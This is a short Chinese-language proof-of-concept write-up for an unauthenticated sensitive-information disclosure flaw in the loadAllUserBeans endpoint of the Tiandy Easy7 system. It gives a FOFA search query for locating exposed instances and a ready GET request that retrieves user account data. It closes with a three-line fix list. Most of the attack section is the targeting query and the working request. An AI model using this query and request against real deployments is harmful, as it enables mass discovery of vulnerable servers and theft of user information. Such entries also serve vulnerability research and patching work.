# 天地伟业Easy7 loadAllUserBeans敏感信息泄露漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 天地伟业Easy7 loadAllUserBeans接口敏感信息泄露 |
| 漏洞类型 | 敏感信息泄露 |
| 影响组件 | loadAllUserBeans |
| 影响版本 | 天地伟业Easy7 |

## 漏洞概述

天地伟业Easy7系统loadAllUserBeans接口存在敏感信息泄露漏洞，攻击者可直接获取系统用户敏感信息。

## fofa查询语句

```
app="Tiandy-Easy7"
```

## 漏洞复现

### POC

```http
GET /Easy7/rest/user/loadAllUserBeans HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```

### 漏洞特征

- 路径：/Easy7/rest/user/loadAllUserBeans
- HTTP方法：GET

## 修复建议

1. 打补丁
2. 增加接口认证
3. 限制敏感信息访问
